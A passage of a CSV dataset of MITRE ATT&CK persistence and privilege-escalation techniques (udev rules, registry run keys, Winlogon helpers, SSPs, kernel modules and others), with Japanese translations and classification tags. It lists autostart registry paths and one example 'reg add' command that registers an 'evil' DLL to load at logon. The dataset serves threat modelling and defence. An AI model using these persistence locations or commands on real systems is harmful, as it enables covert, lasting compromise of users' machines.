正規アプリケーションのインストールプロセス終了時、macOSの`postinstall`スクリプトなどのコンテンツが継承された昇格権限で実行される可能性があります。攻撃者はこれらのスクリプトを利用し、昇格権限で悪意のある実行ファイルを実行したり、他の悪意のあるコンポーネント（例：[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)）をインストールしたりできます。(引用: Application Bundle Manipulation Brandon Dalton)(引用: wardle evilquest parti)(引用: Windows AppleJeus GReAT)(引用: Debian Manual Maintainer Scripts)ディストリビューションによっては、Linux版パッケージインストーラースクリプトはメンテナースクリプトまたはポストインストールスクリプトと呼ばれることがあります。これらのスクリプトには`preinst`、`postinst`、`prerm`、`postrm`スクリプトが含まれ、実行時にはroot権限で動作します。 Windowsでは、Microsoft Installerサービスが`.msi`ファイルを使用してアプリケーションのインストール、更新、アンインストールを管理します。これらのインストールルーチンには、攻撃者に悪用される可能性のある追加アクションを実行する指示が含まれる場合もあります。(引用: Microsoft Installation Procedures),privilege-escalation;persistence,Linux;macOS;Windows,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--da051493-ae9c-4b1b-9760-c009c46c9b56,2022-09-27T18:02:16.026Z,2025-04-15T19:59:13.167Z,,,,
T1546.017,T1546,Udev Rules,Udevルール,"Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024) Adversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content’s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)",攻撃者は、udevルールを使用してトリガーされる悪意のあるコンテンツを実行することで、永続性を維持する可能性があります。 UdevはLinuxカーネルのデバイス管理システムであり、デバイスノードを動的に管理し、`/dev`ディレクトリ内の疑似デバイスファイルへのアクセスを処理し、ハードドライブやキーボードなどの外部デバイスが接続または取り外された際のハードウェアイベントに応答します。Udevはルールファイルを使用し、`matchキー`でハードウェアイベントが満たすべき条件を指定し、`actionキー`で実行すべきアクションを定義します。 `/etc/udev/rules.d/`、`/run/udev/rules.d/`、`/usr/lib/udev/rules.d/`、`/usr/local/lib/udev/rules.d/`、`/lib/udev/rules.d/` に配置されたルールファイルの作成・変更・削除には root 権限が必要です。 ルールの優先度は、ディレクトリとルールファイル名の数字プレフィックスの両方によって決定されます。(引用: Ignacio Udev research 2024)(引用: Elastic Linux Persistence 2024) 攻撃者は、udev ルールファイルにルールを追加または変更して悪意のあるコンテンツを実行することにより、udev サブシステムを悪用する可能性があります。 例えば、攻撃者は、アプリケーションが `/dev/random` などの疑似デバイスファイルにアクセスするたびに、自身のバイナリを実行するルールを設定する可能性があります。 udev は短いタスクの実行に限定され、systemd-udevd のサンドボックス（ネットワークおよびファイルシステムへのアクセスをブロック）によって制限されていますが、攻撃者はアクションキー `RUN+=` の下でスクリプトコマンドを使用して、悪意のあるコンテンツのプロセスをバックグラウンドで分離して実行し、これらの制御をバイパスすることができます。(引用: Reichert aon sedexp 2024),persistence;privilege-escalation,Linux,script_command_execution,privilege_gain,privileged_account;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--f4c3f644-ab33-433d-8648-75cc03a95792,2024-09-26T17:02:09.888Z,2025-04-15T23:17:25.978Z,,,,
T1547,,Boot or Logon Autostart Execution,起動時またはログオン時の自動実行,"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel. Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",攻撃者は、システムブート時またはログオン時にプログラムを自動実行するようシステム設定を構成し、侵害されたシステム上で永続性を維持したり、より高い特権を取得したりする可能性があります。オペレーティングシステムには、システムブート時やアカウントログオン時にプログラムを自動実行するメカニズムが存在する可能性があります。（引用元：Microsoft Run Key）（引用元：MSDN Authentication Packages）（引用元：Microsoft TimeProvider）（引用元：Cylance Reg Persistence Sept 2013）(引用: Linuxカーネルプログラミング) これらのメカニズムには、特別に指定されたディレクトリに配置されたプログラム、またはWindowsレジストリなどの設定情報を保存するリポジトリによって参照されるプログラムの自動実行が含まれる場合があります。攻撃者はカーネルの機能を改変または拡張することで同様の目的を達成できます。一部の起動時/ログオン時自動実行プログラムはより高い特権で実行されるため、攻撃者はこれらを利用して特権昇格を図ることがあります。,persistence;privilege-escalation,Linux;macOS;Windows;Network Devices,config_policy_manipulation,privilege_gain,authentication_system;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf,2020-01-23T17:46:59.535Z,2025-04-15T19:58:12.270Z,,,,
T1547.001,T1547,Registry Run Keys / Startup Folder,レジストリ実行キー/スタートアップフォルダ,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. The following run keys are created by default on Windows systems: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018) Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>. The following Registry keys can be used to set startup folder items for persistence: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> The following Registry keys can control automatic startup of services during boot: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code> Using policy settings to specify startup programs creates corresponding values in either of two Registry keys: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user. By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot. Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","攻撃者は、プログラムをスタートアップフォルダに追加するか、レジストリのランキーで参照することで永続化を達成する可能性がある。レジストリの「ランキー」またはスタートアップフォルダにエントリを追加すると、ユーザーがログオンした際に参照されたプログラムが実行される。(引用: Microsoft Run Key) これらのプログラムはユーザーのコンテキストで実行され、アカウントに関連付けられた権限レベルを持つ。 Windowsシステムではデフォルトで以下の実行キーが作成される：* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> 実行キーは複数のハイブ下に存在する可能性があります。(引用元: Microsoft Wow6432Node 2018)(引用元: Malwarebytes Wow6432Node 2016) <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> も利用可能ですが、Windows Vista 以降ではデフォルトでは作成されません。レジストリの実行キーエントリは、プログラムを直接参照するか、依存関係としてリストすることができます。(引用元: Microsoft Run Key) 例えば、RunOnceEx の「Depend」キーを使用してログオン時に DLL をロードすることが可能です: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (引用元: Oddvar Moe RunOnceEx Mar 2018) プログラムをスタートアップフォルダに配置すると、ユーザーログイン時にそのプログラムが実行されます。個別ユーザーアカウント用のスタートアップフォルダと、どのユーザーアカウントでログインしてもチェックされるシステム全体のスタートアップフォルダが存在します。 現在のユーザーのスタートアップフォルダパスは <code>C:\Users\\[ユーザー名]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> です。全ユーザーのスタートアップフォルダパスは <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> です。 以下のレジストリキーを使用して、スタートアップフォルダ項目を永続化できます：* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> 以下のレジストリキーは、起動時のサービスの自動起動を制御できます: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code> ポリシー設定を使用して起動プログラムを指定すると、次のいずれかのレジストリキーに対応する値が作成されます: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>レジストリキー <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> のロード値にリストされているプログラムは、現在ログオンしているユーザーに対して自動的に実行されます。 デフォルトでは、レジストリキー <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> のマルチストリング値 <code>BootExecute</code> は <code>autocheck autochk *</code> に設定されています。この値により、システムが異常終了した場合、Windows は起動時にハードディスクのファイルシステム整合性をチェックします。 攻撃者は、このレジストリ値に他のプログラムやプロセスを追加し、起動時に自動的に実行させることができます。攻撃者はこれらの設定場所を利用して、システム再起動後も永続性を維持するためのマルウェア（リモートアクセスツールなど）を実行できます。攻撃者はまた、[偽装](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正当なプログラムに関連付けられているように見せかける可能性があります。",persistence;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279,2020-01-23T22:02:48.566Z,2025-04-15T19:58:54.099Z,,,,
T1547.002,T1547,Authentication Package,認証パッケージ,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages) Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>""Authentication Packages""=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.","攻撃者は、システム起動時に認証パッケージを悪用してDLLを実行する可能性があります。Windows認証パッケージのDLLは、システム起動時にローカルセキュリティ機関（LSA）プロセスによって読み込まれます。これらはオペレーティングシステムに対して、複数のログオンプロセスおよび複数のセキュリティプロトコルへのサポートを提供します。(引用元: MSDN 認証パッケージ) 攻撃者は、LSA 認証パッケージが提供する自動起動メカニズムを利用して、Windows レジストリの <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> にあるキー <code>""Authentication Packages""=&lt;対象バイナリ&gt;</code> にバイナリへの参照を配置することで、永続化を図ることができます。 これにより、認証パッケージがロードされると、システムによってバイナリが実行されます。",persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,authentication_system;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec,2020-01-24T14:54:42.757Z,2025-04-16T20:37:19.684Z,,,,
T1547.003,T1547,Time Providers,タイムプロバイダー,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider) Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider) Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",攻撃者は、システム起動時にDLLを実行するためにタイムプロバイダーを悪用する可能性があります。Windows Timeサービス（W32Time）は、ドメイン間およびドメイン内の時刻同期を可能にします。（引用元: Microsoft W32Time 2018年2月）W32Timeタイムプロバイダーは、ハードウェア/ネットワークリソースからタイムスタンプを取得し、これらの値を他のネットワーククライアントに出力する役割を担います。（引用元: Microsoft TimeProvider) タイムプロバイダーは、`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\` のサブキーに登録されるダイナミックリンクライブラリ（DLL）として実装される。(引用元: Microsoft TimeProvider) サービス制御マネージャーの指示を受けたタイムプロバイダーマネージャーは、システム起動時および/またはパラメータ変更時に、このキーの下でリストされ有効化されたタイムプロバイダーをロードして起動する。(引用元: Microsoft TimeProvider) 攻撃者はこのアーキテクチャを悪用し、特に`DllName`値で悪意のあるDLLを指す任意の名称のサブキーを作成することで、永続性を確立する可能性があります。タイムプロバイダーの登録には管理者権限が必要ですが、実行はローカルサービスアカウントのコンテキストで行われます。(引用元: Github W32Time Oct 2017),persistence;privilege-escalation,Windows,discovery_enumeration,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc,2020-01-24T15:51:52.317Z,2025-04-15T19:58:35.700Z,,,,
T1547.004,T1547,Winlogon Helper DLL,Winlogon ヘルパー DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013) * Winlogon\Notify - points to notification package DLLs that handle Winlogon events * Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on * Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",攻撃者は、ユーザーログイン時にDLLや実行ファイルを実行するためにWinlogonの機能を悪用する可能性があります。Winlogon.exeは、ログオン/ログオフ時の処理やCtrl-Alt-Deleteでトリガーされるセキュアアテンションシーケンス（SAS）を担当するWindowsコンポーネントです。 <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> および <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> のレジストリエントリは、Winlogon をサポートする追加のヘルパープログラムや機能を管理するために使用されます。(引用: Cylance Reg Persistence 2013年9月) これらのレジストリキーへの悪意のある改変により、Winlogonが不正なDLLや実行ファイルを読み込み実行する可能性があります。具体的には、以下のサブキーが悪用される恐れがあると報告されています: (引用: Cylance Reg Persistence 2013年9月) * Winlogon\Notify - Winlogonイベントを処理する通知パッケージDLLを指す * Winlogon\Userinit - ユーザーログオン時に実行されるユーザー初期化プログラムuserinit.exeを指す * Winlogon\Shell - ユーザーログオン時に実行されるシステムシェルexplorer.exeを指す攻撃者はこれらの機能を利用して悪意のあるコードを繰り返し実行し、永続性を確立する可能性があります。,persistence;privilege-escalation,Windows,script_command_execution,privilege_gain,user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35,2020-01-24T16:59:59.688Z,2025-04-15T19:58:37.982Z,,,,
T1547.005,T1547,Security Support Provider,セキュリティサポートプロバイダ,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",攻撃者は、システム起動時にDLLを実行するためにセキュリティサポートプロバイダー（SSP）を悪用する可能性がある。Windows SSP DLLは、システム起動時にローカルセキュリティ機関（LSA）プロセスにロードされる。LSAにロードされると、SSP DLLはWindowsに保存されている暗号化パスワードや平文パスワード（ログオン中のユーザーのドメインパスワードやスマートカードのPINなど）にアクセスできる。 SSP構成は2つのレジストリキーに保存される：<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> および <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>。 攻撃者はこれらのレジストリキーを改変し、新しいSSPを追加することが可能です。追加されたSSPは、システムの次回起動時、またはAddSecurityPackage Windows API関数が呼び出された際にロードされます。(引用: Graeber 2014),persistence;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462,2020-01-24T17:16:11.806Z,2025-04-25T14:46:38.641Z,,,,
T1547.006,T1547,Kernel Modules and Extensions,カーネルモジュールと拡張機能,"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview) Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS) Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation) Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",攻撃者は、システム起動時にプログラムを自動的に実行するようカーネルを改変する可能性があります。ロード可能カーネルモジュール（LKMs）は、必要に応じてカーネルにロードおよびアンロードできるコードの断片です。これらはシステムを再起動する必要なくカーネルの機能を拡張します。 例えば、デバイスドライバは、システムに接続されたハードウェアへのカーネルアクセスを可能にするモジュールの一種である。(引用: Linux Kernel Programming)悪意を持って使用された場合、LKMsは最高レベルのOS特権（リング0）で動作するカーネルモード型[ルートキット](https://attack.mitre.org/techniques/T1014)となり得る。（引用元：Linux Kernel Module Programming Guide）LKMベースのルートキットに共通する機能には、自己隠蔽、ファイル・プロセス・ネットワーク活動の部分的隠蔽、ログ改ざん、認証済みバックドアの提供、非特権ユーザーへのrootアクセス許可などが含まれる。（引用元：iDefense Rootkit Overview）カーネル拡張（通称kext）はmacOSにおいて、LinuxのLKMと同様にシステムへ機能を追加するために使用される。 カーネルはセキュリティの強制を担当し、カーネル拡張はカーネルの一部として実行されるため、KextsはmacOSのセキュリティポリシーの対象外です。Kextsは<code>kextload</code>および<code>kextunload</code>コマンドを通じてロードおよびアンロードされます。Kextsは、Appleからカーネル拡張への署名権限を付与された開発者IDで署名する必要があります。 この特権を持たない開発者もKextsに署名することは可能ですが、SIPが無効化されていない限りロードされません。 SIPが有効な場合、kextの署名はAuxKCに追加される前に検証されます。(引用元: macOSにおけるシステムおよびカーネル拡張)macOS Catalina 10.15以降、カーネル拡張はシステム拡張に取って代わられ非推奨となりました。ただし、カーネルプログラミングインターフェース用のシステム拡張が存在しないため、kextは「レガシーシステム拡張」として依然として許可されています。(引用元: Apple Kernel Extension Deprecation) 攻撃者は LKM や kext を利用して、システム上で [永続化](https://attack.mitre.org/tactics/TA0003) や [権限昇格](https://attack.mitre.org/tactics/TA0004) を実行できます。 実例が実環境で確認されており、関連するオープンソースプロジェクトもいくつか存在する。(引用: Volatility Phalanx2)(引用: CrowdStrike Linux Rootkit)(引用: GitHub Reptile)(引用: GitHub Diamorphine)(引用: RSAC 2015 San Francisco Patrick Wardle)(引用: Synack Secure Kernel Extension Broken)(引用: Securelist Ventir)(引用: Trend Micro Skidmap),persistence;privilege-escalation,macOS;Linux,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6,2020-01-24T17:42:23.339Z,2025-04-15T19:58:54.982Z,,,,
T1547.007,T1547,Re-opened Applications,再起動されたアプリケーション,"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to ""Reopen windows when logging back in"".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon. Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",攻撃者は、ユーザーがログインした際にアプリケーションを自動的に実行するようplistファイルを変更する可能性があります。ユーザーがmacOSのグラフィカルユーザーインターフェース（GUI）経由でログアウトまたは再起動する場合、「次回ログイン時にウィンドウを再表示」というチェックボックス付きのメッセージが表示されます。(引用: Re-Open windows on Mac) これを選択すると、現在開いているすべてのアプリケーションが<code>~/Library/Preferences/ByHost</code>ディレクトリ内の<code>com.apple.loginwindow.[UUID].plist</code>に追加されます。(引用: Methods of Mac Malware Persistence)(引用: Wardle Persistence Chapter) このファイルに記載されたアプリケーションは、ユーザーの次回ログイン時に自動的に再開されます。 攻撃者は、<code>com.apple.loginwindow.[UUID].plist</code> ファイルに悪意のあるアプリケーションのパスを追加することで、ユーザーがログインしたときにペイロードを実行し、[持続性](https://attack.mitre.org/tactics/TA0003) を確立することができます。,persistence;privilege-escalation,macOS,discovery_enumeration,privilege_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e,2020-01-24T18:15:06.641Z,2025-04-16T20:37:22.343Z,,,,
